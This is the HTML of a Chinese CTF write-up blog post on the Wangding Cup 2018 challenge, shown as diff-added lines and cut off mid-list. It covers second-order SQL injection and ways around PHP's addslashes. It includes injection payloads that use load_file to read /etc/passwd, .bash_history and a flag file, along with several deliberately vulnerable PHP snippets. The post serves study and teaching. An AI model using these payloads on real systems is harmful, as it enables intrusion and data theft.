@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x00前言这道题目本身虽然只是考察二次注入,但是寻找问题解决方法的过程中遇到了一些不相关知识点,也来记录下 0x01题解 发现提交评论需要登录,然后login.php 爆破得到zhangwei&#x2F;zhangwei666  GitTools在P牛小密圈发现了一个比较好用的工具,可以提取每次commit的信息,这样比赛的时候也不必担心会在Git上面做文章了. 项目地址  https:&#x2F;&#x2F;github.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入">
+<meta property="og:url" content="http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/index.html">
+<meta property="og:site_name" content="L0nm4r|Blog">
+<meta property="og:description" content="0x00前言这道题目本身虽然只是考察二次注入,但是寻找问题解决方法的过程中遇到了一些不相关知识点,也来记录下 0x01题解 发现提交评论需要登录,然后login.php 爆破得到zhangwei&#x2F;zhangwei666  GitTools在P牛小密圈发现了一个比较好用的工具,可以提取每次commit的信息,这样比赛的时候也不必担心会在Git上面做文章了. 项目地址  https:&#x2F;&#x2F;github.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/1612261070642.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/1612261129353.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/FpRCBXp7giiPnJXsDB3NoTBZVmxe">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/image.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/4.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/1612261796989.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/a76dca5f4446c1c5701e2e89a36896eb.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/2e049f48ec86091b5977842d727591d4.png">
+<meta property="article:published_time" content="2021-02-02T10:15:44.000Z">
+<meta property="article:modified_time" content="2021-02-02T15:42:07.000Z">
+<meta property="article:author" content="L0nm4r">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/1612261070642.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <li><a href="/">首页</a></li><li><a href="/about/">关于</a></li><li><a href="/archives/">归档</a></li><li><a target="_blank" rel="noopener" href="https://github.com/L0nm4r">项目</a></li>
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/02/03/PHP%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/01/31/HTTP%20request%20smuggling/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&text=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&title=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&is_video=false&description=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入&body=Check out this article: http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&title=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&title=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&title=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&title=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://l0nnnaruu.github.io/2021/02/02/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/&name=网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E9%A2%98%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">0x01题解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GitTools"><span class="toc-number">2.1.</span> <span class="toc-text">GitTools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">二次注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">0x02 二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-addslashes"><span class="toc-number">4.</span> <span class="toc-text">0x03 addslashes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-addslashes"><span class="toc-number">4.1.</span> <span class="toc-text">bypass addslashes</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-insert%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">0x04 insert注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%9C%80%E5%90%8E"><span class="toc-number">6.</span> <span class="toc-text">0x05 最后</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">L0nm4r|Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2021-02-02T10:15:44.000Z" itemprop="datePublished">2021-02-02</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/ctf/" rel="tag">ctf</a>, <a class="tag-link-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a>, <a class="tag-link-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>这道题目本身虽然只是考察二次注入,但是寻找问题解决方法的过程中遇到了一些不相关知识点,也来记录下</p>
+<h2 id="0x01题解"><a href="#0x01题解" class="headerlink" title="0x01题解"></a>0x01题解</h2><p> 发现提交评论需要登录,然后login.php 爆破得到zhangwei/zhangwei666 </p>
+<h3 id="GitTools"><a href="#GitTools" class="headerlink" title="GitTools"></a>GitTools</h3><p>在P牛小密圈发现了一个比较好用的工具,可以提取每次commit的信息,这样比赛的时候也不必担心会在Git上面做文章了. 项目地址  <a target="_blank" rel="noopener" href="https://github.com/internetwache/GitTools">https://github.com/internetwache/GitTools</a> </p>
+<p>中间还找到了一篇相关文章 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html">https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html</a> </p>
+<p>具体使用:</p>
+<p>先用Dumper下载git文件</p>
+<p><img src="1612261070642.png" alt="1612261070642"></p>
+<p>然后用Extractor提取commit记录和文件</p>
+<p><img src="1612261129353.png" alt="1612261129353"></p>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>得到的代码(省略了一些不相关的代码)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = mysql_num_rows(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = mysql_fetch_array(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p> 可以看到addslashes()函数把传入的参数过滤了.尝试宽字节注入,未果. 在尝试<code>%df</code>吸收<code>\</code>的时候,发现只是没有<code>%df</code>回显而已,并不代表可以宽字节注入 .当然,这道题如果设置set character_set_client = gbk是可以利用宽字节进行注入的. </p>
+<p>实际本题考察的点为二次注入,引用了p牛小密圈的一张图,来说明Mysql对<code>\&#39;</code>的处理</p>
+<p> <img src="FpRCBXp7giiPnJXsDB3NoTBZVmxe" alt="image"> </p>
+<p> 引号<code> &#39;</code> 在addslashes()作用下,变成<code> \&#39;</code> , 但是在插入数据库的时候又会变成 <code>&#39;</code>   , 在下面的代码中,没有对从数据库中读出来的<code>$category</code>进行过滤就将它插入到了新的SQL语句中,从而造成二次注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$category</span> = mysql_fetch_array(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">发帖:</span><br><span class="line">category<span class="operator">=</span><span class="string">&#x27;,content=user(),/*</span></span><br><span class="line"><span class="string">留言:</span></span><br><span class="line"><span class="string">content=*/#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">在二次注入的sql语句中,利用多行注释来注入</span></span><br><span class="line"><span class="string">$sql = &quot;insert into comment</span></span><br><span class="line"><span class="string">set category = &#x27;&#x27;,content=user(),/*&#x27;</span>,</span><br><span class="line">content <span class="operator">=</span> <span class="string">&#x27;*/#&#x27;</span>,</span><br><span class="line">bo_id <span class="operator">=</span> <span class="string">&#x27;$bo_id&#x27;</span>&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>最后的一些效果 </p>
+<p><img src="image.png" alt="image.png"> </p>
+<p>然后构造读取文件的payload,本题利用sql读取文件又是另一个点, 这个直接参考peri0d师傅的wp <a target="_blank" rel="noopener" href="https://www.cnblogs.com/peri0d/p/14077324.html">https://www.cnblogs.com/peri0d/p/14077324.html</a>. (这个读取文件,又要在别的师傅博客找找思路,以前并没有见过这种思路</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#39;,content&#x3D;(select load_file(&quot;&#x2F;etc&#x2F;passwd&quot;)),&#x2F;*</span><br><span class="line">&#39;,content&#x3D;(select load_file(&quot;&#x2F;home&#x2F;www&#x2F;.bash_history&quot;)),&#x2F;*</span><br><span class="line"># cd &#x2F;tmp&#x2F; unzip html.zip rm -f html.zip cp -r html &#x2F;var&#x2F;www&#x2F; cd &#x2F;var&#x2F;www&#x2F;html&#x2F; rm -f .DS_Store service apache2 start</span><br><span class="line">&#39;,content&#x3D;(select hex(load_file(&quot;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&quot;))),&#x2F;*</span><br><span class="line">&#39;,content&#x3D;(select hex(load_file(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&quot;))),&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>也没有尝试直接执行命令,题目应该是禁止的.</p>
+</blockquote>
+<h2 id="0x02-二次注入"><a href="#0x02-二次注入" class="headerlink" title="0x02 二次注入"></a>0x02 二次注入</h2><p>做了这么多sql注入,看了这么多文章.遇到这个还是没想到. 这次来总结一些特征. </p>
+<p>借用了Spoock师傅博客一张图: <a target="_blank" rel="noopener" href="https://blog.spoock.com/2017/03/27/sql-mutil-injecton-and-block/">https://blog.spoock.com/2017/03/27/sql-mutil-injecton-and-block/</a></p>
+<p> <img src="4.png" alt="img"> </p>
+<p>最主要的是Mysql对<code>\&#39;</code>的处理,Mysql把<code>\&#39;</code>当作一个字符,而不是两个.直接截取P牛小密圈的一段话</p>
+<p><img src="1612261796989.png" alt="1612261796989"></p>
+<p>重点是应该警惕addslashes(),并不是使用了addslashes()就是安全的.二次注入就暴露了一些addslashes()的安全问题,只不过这点不存在于它本身,而是开发者对addslashes()的信任和不了解</p>
+<h2 id="0x03-addslashes"><a href="#0x03-addslashes" class="headerlink" title="0x03 addslashes"></a>0x03 addslashes</h2><p>此题之后我对addslashes的看法完全改变了,它并没有我想象的这么安全, 来看一看addslashes会有那些安全问题</p>
+<h3 id="bypass-addslashes"><a href="#bypass-addslashes" class="headerlink" title="bypass addslashes"></a>bypass addslashes</h3><p>做题的时候找到了这篇文章 <a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-10899-1-1.html">代码审计之绕过addslashes总结</a>, </p>
+<p>总结下其中的bypass方法:</p>
+<ol>
+<li><p>宽字节注入 </p>
+<p>一个是熟知的``%df%5c<code> =&gt;</code> 運  `utf-8 =&gt; gbk</p>
+<p>一个是逆向的gbk=&gt;utf-8<code>錦(0xe55c)\&#39;</code>=&gt;<code>%e5%5c%5c%27</code>=&gt; <code>%5e\\&#39;</code></p>
+<p>关键代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(<span class="string">&quot;SET NAMES &#x27;gbk&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$username</span>=iconv(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;gbk&#x27;</span>,<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$username</span>=iconv(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>,<span class="variable">$username</span>);</span><br></pre></td></tr></table></figure></li>
+<li><p>编码绕过</p>
+<p>下面这些比较明显</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># urldecode</span></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$username</span>=addslashes(<span class="variable">$username</span>);[/size][/color]</span><br><span class="line"><span class="variable">$username</span>=urldecode(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64_decode</span></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$username</span>=addslashes(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$username</span>=base64_decode(<span class="variable">$username</span>);</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>json编码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;admin\&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=addslashes(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment"># admin\\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$username</span>=addslashes(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$username</span>=json_encode(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span>=md5(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select count(*) as num from admin where name=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and pass=&#x27;&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span>=mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure></li>
+<li><p><code>stripslashes</code>  删除反斜杠：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> stripslashes(<span class="string">&quot;Who\&#x27;s Bill Gates?&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> <span class="comment">#   &quot;Who&#x27;s Bill Gates?</span></span><br></pre></td></tr></table></figure></li>
+<li><p>字符替换导致的绕过addslashes </p>
+<p>文中给的示例, 这个还比较直接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>=addslashes(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$username</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot; &quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span>=md5(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select count(*) as num from admin where name=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and pass=&#x27;&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span>=mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+
+<p>还有 CISCN2019 总决赛 Day2 Web1 的Easyweb</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=addslashes(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br></pre></td></tr></table></figure>
+
+<p> 传入<code>?id=\0&amp;path=or id=1%23</code> =&gt; 最后的sql语句<code>select * from images where id=&#39;\&#39; or path=&#39;or id=1#&#39;</code> </p>
+</li>
